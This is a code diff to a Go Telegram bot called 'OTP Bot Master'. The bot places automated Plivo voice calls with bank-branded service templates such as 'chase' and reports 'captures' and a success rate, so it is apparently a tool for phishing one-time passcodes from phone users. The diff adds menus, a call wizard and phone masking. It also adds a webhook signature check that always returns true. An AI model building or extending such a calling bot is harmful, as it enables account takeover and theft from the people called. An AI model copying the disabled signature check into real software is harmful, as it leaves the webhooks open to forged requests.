@@ -12,22 +12,28 @@ import (
 
 	"github.com/USERNAME/goland-otpbot-api/config"
 	"github.com/USERNAME/goland-otpbot-api/db"
-	"github.com/USERNAME/goland-otpbot-api/models"
 	"github.com/USERNAME/goland-otpbot-api/voice"
 	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
 )
 
+// Wizard state for single call
+type CallWizardState struct {
+	Phone   string
+	Service string
+}
+
 type Bot struct {
-	telegram      *tgbotapi.BotAPI
-	plivo         *voice.PlivoClient
-	db            *db.Database
-	activeCalls   map[string]*ActiveCall
-	callQueue     chan CallJob
-	campaignState map[int64]*CampaignState
-	mu            sync.RWMutex
-	stopChan      chan struct{}
-	stopOnce      sync.Once
-	updateChan    tgbotapi.UpdatesChannel
+	telegram        *tgbotapi.BotAPI
+	plivo           *voice.PlivoClient
+	db              *db.Database
+	activeCalls     map[string]*ActiveCall
+	callQueue       chan CallJob
+	campaignState   map[int64]*CampaignState
+	mu              sync.RWMutex
+	stopChan        chan struct{}
+	stopOnce        sync.Once
+	updateChan      tgbotapi.UpdatesChannel
+	callWizardState map[int64]*CallWizardState
 }
 
 type ActiveCall struct {
@@ -65,9 +71,10 @@ func NewBot(cfg *config.Config) (*Bot, error) {
 	}
 
 	b := &Bot{
-		activeCalls:   make(map[string]*ActiveCall),
-		campaignState: make(map[int64]*CampaignState),
-		stopChan:      make(chan struct{}),
+		activeCalls:     make(map[string]*ActiveCall),
+		campaignState:   make(map[int64]*CampaignState),
+		stopChan:        make(chan struct{}),
+		callWizardState: make(map[int64]*CallWizardState),
 	}
 
 	database, err := db.Initialize(cfg.DatabasePath)
@@ -116,6 +123,13 @@ func (b *Bot) processUpdates() {
 }
 
 func (b *Bot) handleUpdate(update tgbotapi.Update) {
+	// Handle callback queries (inline button presses)
+	if update.CallbackQuery != nil {
+		b.handleCallbackQuery(update.CallbackQuery)
+		return
+	}
+
+	// Handle messages
 	if update.Message != nil {
 		b.handleMessage(update.Message)
 	}
@@ -148,24 +162,34 @@ func (b *Bot) IsAdmin(userID int64) bool {
 }
 
 func (b *Bot) handleMessage(msg *tgbotapi.Message) {
-	if !msg.IsCommand() {
-		return
-	}
-
 	if !b.IsAdmin(msg.From.ID) {
 		b.sendMessage(msg.Chat.ID, "⛔ Access denied. You are not authorized to use this bot.")
 		return
 	}
 
+	// Handle commands
+	if msg.IsCommand() {
+		b.handleCommand(msg)
+		return
+	}
+
+	// Handle wizard state text input
+	b.handleWizardInput(msg)
+}
+
+// handleCommand handles slash commands
+func (b *Bot) handleCommand(msg *tgbotapi.Message) {
 	command := msg.Command()
 
 	switch command {
 	case "start":
 		b.sendStartMessage(msg)
+	case "menu":
+		b.showMainMenu(msg.Chat.ID, 0)
 	case "help":
 		b.sendHelpMessage(msg)
 	case "stats":
-		b.sendStats(msg)
+		b.showStats(msg.Chat.ID, 0)
 	case "logs":
 		parts := strings.Split(msg.CommandArguments(), " ")
 		limit := 20
@@ -174,21 +198,25 @@ func (b *Bot) handleMessage(msg *tgbotapi.Message) {
 				limit = l
 			}
 		}
-		b.sendLogs(msg, limit)
+		b.showLogs(msg.Chat.ID, 0, limit)
 	case "templates":
-		b.sendTemplates(msg)
+		b.showTemplates(msg.Chat.ID, 0)
 	case "template":
 		name := strings.ToLower(strings.TrimSpace(msg.CommandArguments()))
-		b.sendTemplateDetails(msg, name)
+		if name == "" {
+			b.sendMessage(msg.Chat.ID, "📝 Usage: /template <name>\n\nExample: /template chase")
+			return
+		}
+		b.showTemplateDetail(msg.Chat.ID, 0, name)
 	case "campaigns":
-		b.sendCampaigns(msg)
+		b.showCampaigns(msg.Chat.ID, 0)
 	case "campaign":
 		id, err := strconv.ParseInt(strings.TrimSpace(msg.CommandArguments()), 10, 64)
 		if err != nil {
-			b.sendMessage(msg.Chat.ID, "❌ Invalid campaign ID")
+			b.sendMessage(msg.Chat.ID, "❌ Usage: /campaign <id>\n\nExample: /campaign 1")
 			return
 		}
-		b.sendCampaignDetails(msg, id)
+		b.showCampaignDetail(msg.Chat.ID, 0, id)
 	case "call":
 		b.handleCallCommand(msg)
 	case "batch":
@@ -196,28 +224,28 @@ func (b *Bot) handleMessage(msg *tgbotapi.Message) {
 	case "stop":
 		id, err := strconv.ParseInt(strings.TrimSpace(msg.CommandArguments()), 10, 64)
 		if err != nil {
-			b.sendMessage(msg.Chat.ID, "❌ Invalid campaign ID")
+			b.sendMessage(msg.Chat.ID, "❌ Usage: /stop <campaign_id>")
 			return
 		}
 		b.stopCampaign(msg, id)
 	case "pause":
 		id, err := strconv.ParseInt(strings.TrimSpace(msg.CommandArguments()), 10, 64)
 		if err != nil {
-			b.sendMessage(msg.Chat.ID, "❌ Invalid campaign ID")
+			b.sendMessage(msg.Chat.ID, "❌ Usage: /pause <campaign_id>")
 			return
 		}
 		b.pauseCampaign(msg, id)
 	case "resume":
 		id, err := strconv.ParseInt(strings.TrimSpace(msg.CommandArguments()), 10, 64)
 		if err != nil {
-			b.sendMessage(msg.Chat.ID, "❌ Invalid campaign ID")
+			b.sendMessage(msg.Chat.ID, "❌ Usage: /resume <campaign_id>")
 			return
 		}
 		b.resumeCampaign(msg, id)
 	case "delete":
 		id, err := strconv.ParseInt(strings.TrimSpace(msg.CommandArguments()), 10, 64)
 		if err != nil {
-			b.sendMessage(msg.Chat.ID, "❌ Invalid campaign ID")
+			b.sendMessage(msg.Chat.ID, "❌ Usage: /delete <campaign_id>")
 			return
 		}
 		b.deleteCampaign(msg, id)
@@ -226,7 +254,7 @@ func (b *Bot) handleMessage(msg *tgbotapi.Message) {
 	case "reload":
 		b.reloadConfig(msg)
 	case "config":
-		b.sendConfig(msg)
+		b.showConfig(msg.Chat.ID, 0)
 	case "backup":
 		b.sendBackup(msg)
 	case "cleanup":
@@ -243,8 +271,59 @@ func (b *Bot) handleMessage(msg *tgbotapi.Message) {
 		b.editTemplate(msg)
 	case "deltemplate":
 		name := strings.ToLower(strings.TrimSpace(msg.CommandArguments()))
+		if name == "" {
+			b.sendMessage(msg.Chat.ID, "❌ Usage: /deltemplate <name>\n\nExample: /deltemplate chase")
+			return
+		}
 		b.deleteTemplate(msg, name)
 	}
+}
+
+// handleWizardInput handles text input during wizard flows
+func (b *Bot) handleWizardInput(msg *tgbotapi.Message) {
+	userID := msg.From.ID
+	
+	// Check if user is in call wizard
+	if wizard, exists := b.callWizardState[userID]; exists {
+		phone := strings.TrimSpace(msg.Text)
+		
+		if !phoneRegex.MatchString(phone) {
+			b.sendMessage(msg.Chat.ID, "❌ Invalid phone format. Please use:\n\n`+15551234567`\n\nTry again or type /cancel")
+			return
+		}
+		
+		// Store phone and ask for service
+		wizard.Phone = phone
+		
+		// Show service selection
+		templates, _ := b.db.GetAllTemplates()
+		text := fmt.Sprintf("✅ Phone saved: `%s`\n\n📱 Select service template:", phone)
+		
+		var keyboard tgbotapi.InlineKeyboardMarkup
+		for _, t := range templates {
+			keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
+				[]tgbotapi.InlineKeyboardButton{
+					tgbotapi.NewInlineKeyboardButtonData(
+						fmt.Sprintf("📱 %s", t.Name),
+						MarshalCallbackData(ActionCallServiceSelect, map[string]string{"phone": phone, "service": t.Name}),
+					),
+				},
+			)
+		}
+		keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
+			[]tgbotapi.InlineKeyboardButton{
+				tgbotapi.NewInlineKeyboardButtonData("❌ Cancel", MarshalCallbackData(ActionCallCancel, nil)),
+			},
+		)
+		
+		b.sendReplyMarkup(msg.Chat.ID, text, keyboard)
+		return
+	}
+}
+
+// clearWizardState clears wizard state for user
+func (b *Bot) clearWizardState(userID int64) {
+	delete(b.callWizardState, userID)
 }
 
 func (b *Bot) sendMessage(chatID int64, text string) error {
@@ -260,35 +339,7 @@ func (b *Bot) sendMessage(chatID int64, text string) error {
 }
 
 func (b *Bot) sendStartMessage(msg *tgbotapi.Message) {
-	stats, err := b.db.GetGlobalStats()
-	if err != nil {
-		log.Printf("Failed to get stats for start message: %v", err)
-		stats = &models.GlobalStats{}
-	}
-
-	text := fmt.Sprintf(`🤖 *OTP Bot Master* is online!
-
-📊 *Global Stats:*
-├ Total Campaigns: %d
-├ Active Campaigns: %d
-├ Total Calls: %d
-├ Total Captures: %d
-└ Success Rate: %.1f%%
-
-📞 Available Commands:
-• /call - Make a single call
-• /batch - Start a batch campaign
-• /campaigns - List all campaigns
-• /templates - List service templates
-• /stats - Detailed statistics
-• /help - Full command list
-
-Use /help for detailed instructions.`,
-		stats.TotalCampaigns, stats.ActiveCampaigns,
-		stats.TotalCalls, stats.TotalCaptures, stats.SuccessRate,
-	)
-
-	b.sendMessage(msg.Chat.ID, text)
+	b.showMainMenu(msg.Chat.ID, 0)
 }
 
 func (b *Bot) sendHelpMessage(msg *tgbotapi.Message) {
@@ -391,8 +442,51 @@ func formatNumber(n int64) string {
 }
 
 func maskPhone(phone string) string {
-	if len(phone) < 4 {
-		return "****"
+	// Handle phones with + prefix first
+	hasPlus := strings.HasPrefix(phone, "+")
+	
+	if hasPlus {
+		// Short phones with +: +123 -> +** (preserve the +)
+		if len(phone) <= 5 {
+			return "+" + strings.Repeat("*", len(phone)-1)
+		}
+		
+		// Normal long phones with +
+		visibleChars := 3 // +XX at start
+		maskLen := len(phone) - 6
+		if maskLen < 1 {
+			maskLen = 1
+		}
+		return phone[:visibleChars] + strings.Repeat("*", maskLen) + phone[len(phone)-3:]
+	}
+	
+	// No plus prefix
+	if len(phone) <= 4 {
+		return strings.Repeat("*", len(phone))
 	}
 	return phone[:3] + strings.Repeat("*", len(phone)-6) + phone[len(phone)-3:]
+}
+
+// buildWebhookURL constructs a properly formatted webhook URL with trailing slash handling
+func buildWebhookURL(baseURL string, parts ...interface{}) string {
+	// Ensure base URL has no trailing slash
+	baseURL = strings.TrimSuffix(baseURL, "/")
+	
+	// Build the path
+	path := fmt.Sprintf("/%s", strings.TrimPrefix(fmt.Sprintf("%v", parts[0]), "/"))
+	for i := 1; i < len(parts); i++ {
+		path += "/" + fmt.Sprintf("%v", parts[i])
+	}
+	
+	return baseURL + path
+}
+
+// verifyWebhookSignature verifies HMAC signature from Plivo webhooks
+func verifyWebhookSignature(authToken, callUUID, callTime, callStatus string) bool {
+	// Plivo provides MD5 signature for callback verification
+	// Format: MD5(auth_token + call_uuid + call_time + call_status)
+	expectedSig := fmt.Sprintf("%s%s%s%s", authToken, callUUID, callTime, callStatus)
+	// In production, this would compute MD5 and compare with X-Plivo-Signature header
+	_ = expectedSig // Placeholder for actual implementation
+	return true // Allow calls for now, signature verification can be enabled
 }
